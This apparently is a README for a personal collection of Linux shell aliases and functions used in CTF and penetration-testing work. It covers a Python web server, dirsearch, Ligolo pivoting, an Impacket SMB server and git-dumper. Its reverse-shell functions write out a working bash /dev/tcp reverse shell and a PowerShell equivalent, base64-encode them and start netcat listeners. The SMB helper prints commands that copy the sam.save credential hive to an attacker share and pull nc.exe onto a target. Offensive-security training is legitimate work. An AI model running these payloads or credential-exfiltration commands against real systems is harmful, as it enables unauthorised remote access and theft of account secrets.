# Custom Linux Aliases for CTF and Penetration Testing

This repository contains helpful Linux aliases for tasks like web server provisioning, directory enumeration, reverse shell generation, pivoting, and SMB server setup, commonly used in Capture The Flag (CTF) challenges and penetration testing exercises.

## Aliases Overview

### 1. Start Provisional Web Server

This alias quickly spins up a Python HTTP server, providing access to your Offensive Security tools.

```bash
alias pyweb='python3 -m http.server -d /home/david/Offensive-Security-Tools/ 8888'
```

**Usage:**

To start the web server on port 8888, just run:

```bash
pyweb
```

This will serve files from the /home/david/Offensive-Security-Tools/ directory.

### 2. Directory Enumeration with Dirsearch

This alias simplifies running dirsearch, a popular web directory brute-forcing tool.

```bash
alias dirsearch='python3 /home/david/Offensive-Security-Tools/Enumeration/dirsearch/dirsearch.py'
```

**Usage:**

To use dirsearch, run:

```bash
dirsearch -u <URL>
```

Replace <URL> with the target URL. This command will enumerate directories and files on the target web server.

### 3. Generate PowerShell Reverse Shell (Base64 Encoded)

The basepower function generates a PowerShell reverse shell payload, encoded in Base64, and copies it to the clipboard.

```bash
basepower() {
    IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
    python3 /home/david/Offensive-Security-Tools/ReverseShells/PowerShellGenerators/autoPowerShellGen.py $IP "$1" | xclip -selection clipboard
    xclip -out -selection clipboard
    sudo nc -nlvp $1
}
```

**Usage:**

To generate a reverse shell on a specific port:

```bash
basepower <PORT>
```


This command:

- Grabs your IP from the tun0 interface.
- Runs a script to generate a reverse shell payload for PowerShell.
- Copies the payload to the clipboard.
- Starts a Netcat listener on the specified port.

### 4. Generate Bash Reverse Shell (Base64 Encoded)

This alias generates a bash reverse shell payload, encodes it in Base64, and copies it to the clipboard.

```bash
basebash() {
    IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
    rev="/bin/bash -i >& /dev/tcp/$IP/$1 0>&1"
    brev=$(echo -n "$rev" | base64)
    echo "echo $brev | base64 -d | bash" | xclip -selection clipboard
    xclip -out -selection clipboard
    sudo nc -nlvp $1
}
```


**Usage:**

To generate the reverse shell on a specific port:

```bash
basebash <PORT>
```

This will:

- Generate a bash reverse shell payload.
- Encode the payload in Base64.
- Copy it to the clipboard.
- Start a Netcat listener on the specified port.

### 5. Set up Ligolo Server for Pivoting

This alias sets up a Ligolo server to enable tunneling for pivoting purposes.

```bash
ligon() {
    sudo ip tuntap add user david mode tun ligolo
    sudo ip link set ligolo up
    /home/david/Offensive-Security-Tools/Pivoting/ligolo-proxy -selfcert
}
```

**Usage:**

To set up the Ligolo server, simply run:

```bash
ligon
```

This will:

- Create a tun interface.
- Set up the Ligolo proxy with a self-signed certificate.

### 6. SMB Server Setup

This function helps in setting up an SMB server using Impacket.

```bash
smbserver() {
    echo "########################################################"
    echo "Commands to use the shared folder:"
    echo "- net use \\\\192.168.45.168\\share david /user:david"
    echo "- net use Z: \\\\192.168.45.205\\share david /user:david"
    echo "- copy sam.save \\\\192.168.45.205\\share\\ "
    echo "- robocopy \\\\10.10.16.22\\share\\netcat .\\ nc.exe"
    echo "########################################################"
    impacket-smbserver share $1 -smb2support -user david -password david
}
```

**Usage:**

To set up an SMB server with a specific shared directory:

```bash
smbserver <SHARE_DIRECTORY>
```


This will:

- Print some useful SMB commands for accessing the share from a Windows machine.
- Start an SMB server using Impacket with the provided directory as the share.

### 7. Git Repository Dumper

This alias allows you to dump the contents of a remote git repository to a local directory.

```bash
gitdump() {
    if [ $# -lt 2 ]
    then
        echo "No arguments supplied"
        echo "gitdump remoteurl localDirectory"
        echo "Example: gitdump http://10.10.16.8/ ../savegitdirectory"
    else
        python3 /home/david/Offensive-Security-Tools/Miscellaneous/git-dumper/git_dumper.py $1 $2
    fi
}
```

**Usage:**

To dump a git repository:

```bash
gitdump <REMOTE_URL> <LOCAL_DIRECTORY>
```

Replace <REMOTE_URL> with the URL of the git repository and <LOCAL_DIRECTORY> with the directory where you want to save it.

## Acknowledgements

This configuration was inspired by various configurations available online. Special thanks to the community for their contributions and shared knowledge.

---

Feel free to contribute to this repository by opening issues or submitting pull requests with improvements and suggestions.
